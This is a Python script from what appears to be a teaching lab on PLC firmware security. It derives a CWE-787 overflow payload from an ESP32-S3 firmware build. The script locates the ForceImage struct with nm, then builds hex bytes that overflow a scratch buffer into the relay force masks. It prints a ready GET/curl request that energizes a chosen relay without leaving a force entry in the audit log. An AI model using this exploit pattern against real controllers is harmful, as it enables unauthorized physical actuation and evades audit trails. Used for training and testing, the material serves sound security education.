#!/usr/bin/env python3
"""
derive-force-offset.py - re-derive the CWE-787 overflow payload from a BUILD.

The Part-9 teaching exploit overflows plc_core.cpp's `scratch[]` buffer into the I/O
force image that sits right after it in one struct (ForceImage). The bytes the attacker
must send, and where they land, are a fact of THAT build's memory map - change the
firmware and you must re-derive them. This tool does that:

  1. confirms `s_fi` (the ForceImage object) is present in .bss of the ELF,
  2. checks its size still fits scratch + the two 64-bit masks,
  3. emits the exact overflow payload (and the /api/tag URL) to force a chosen relay.

Usage:
  python3 tools/derive-force-offset.py [--elf .pio/build/m5stamplc/firmware.elf] [--relay 0]

Exit 0 on success; non-zero if the layout moved so the exploit would miss (CI guard).
"""
import argparse, os, subprocess, sys, glob

# ForceImage layout (plc_core.cpp). If you change that struct, change these — and the
# size assertion below will fail loudly until you do, which is the whole lesson.
OFF_SCRATCH   = 0
OFF_COIL_VAL  = 32       # offsetof(ForceImage, coil_force_val)
OFF_COIL_EN   = 40       # offsetof(ForceImage, coil_force_en)
STRUCT_MIN    = OFF_COIL_EN + 8   # scratch(32) + val(8) + en(8) = 48, +di bytes

def find_nm():
    for p in glob.glob(os.path.expanduser("~/.platformio/packages/toolchain-xtensa-esp*/bin/xtensa-esp32s3-elf-nm")):
        return p
    return "xtensa-esp32s3-elf-nm"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--elf", default="sbom/firmware/.pio/build/m5stamplc/firmware.elf")
    ap.add_argument("--relay", type=int, default=0, help="base relay 0-3 (coil = relay+1)")
    ap.add_argument("--host", default="127.0.0.1:8080")
    a = ap.parse_args()
    elf = a.elf if os.path.isfile(a.elf) else next(iter(glob.glob(a.elf)), a.elf)
    if not os.path.isfile(elf):
        sys.exit(f"ELF not found: {elf} (build first: pio run -e m5stamplc)")

    nm = find_nm()
    out = subprocess.run([nm, "-S", elf], capture_output=True, text=True).stdout
    row = None
    for line in out.splitlines():
        # local static mangles as _ZL4s_fi; also accept a plain s_fi
        if line.rstrip().endswith("s_fi") and ("ZL4s_fi" in line or line.split()[-1] == "s_fi"):
            row = line.split()
            break
    if not row:
        sys.exit("s_fi (ForceImage) not found in the ELF. Is this the teaching build "
                 "(ENABLE_CWE_DEMOS on)? The secure build has no such object - and no overflow.")
    addr = int(row[0], 16)
    size = int(row[1], 16) if len(row) >= 4 else 0
    sym_type = row[2] if len(row) >= 4 else row[1]
    in_bss = sym_type in ("b", "B")

    print(f"ForceImage object : s_fi @ 0x{addr:08x}  size={size}  section={'.bss' if in_bss else sym_type}")
    ok_layout = in_bss and size >= STRUCT_MIN
    if not ok_layout:
        print(f"  FAIL: expected s_fi in .bss with size >= {STRUCT_MIN} "
              f"(scratch 32 + coil_force_val 8 + coil_force_en 8). The struct moved - "
              f"update the offsets in this tool and the exploit, then re-run.", flush=True)
        sys.exit(2)

    if not (0 <= a.relay <= 3):
        sys.exit("relay must be 0..3")
    coil = a.relay + 1                       # pointmap: RELAY0 == coil 1
    payload = bytearray(OFF_COIL_EN + 8)     # fill scratch + coil_force_val + coil_force_en
    payload[OFF_COIL_VAL + (coil // 8)] |= (1 << (coil % 8))   # forced VALUE bit = 1
    payload[OFF_COIL_EN  + (coil // 8)] |= (1 << (coil % 8))   # forced ENABLE bit = 1
    hexstr = payload.hex()

    print(f"overflow length   : {len(payload)} bytes "
          f"(fills scratch[{OFF_SCRATCH}:32], writes coil_force_val@{OFF_COIL_VAL}, coil_force_en@{OFF_COIL_EN})")
    print(f"target            : relay{a.relay}  (coil {coil})")
    print(f"payload (hex)     : {hexstr}")
    print(f"exploit request   : GET http://{a.host}/api/tag?data={hexstr}")
    print(f"                    curl 'http://{a.host}/api/tag?data={hexstr}'")
    print("effect            : the next scan honors the corrupted force masks and energizes "
          f"relay{a.relay} - with NO FORCE entry in the audit log (plc_force_coil was never called).")
    # machine-readable last line for the smoke test / CI
    print(f"PAYLOAD_HEX={hexstr}")

if __name__ == "__main__":
    main()
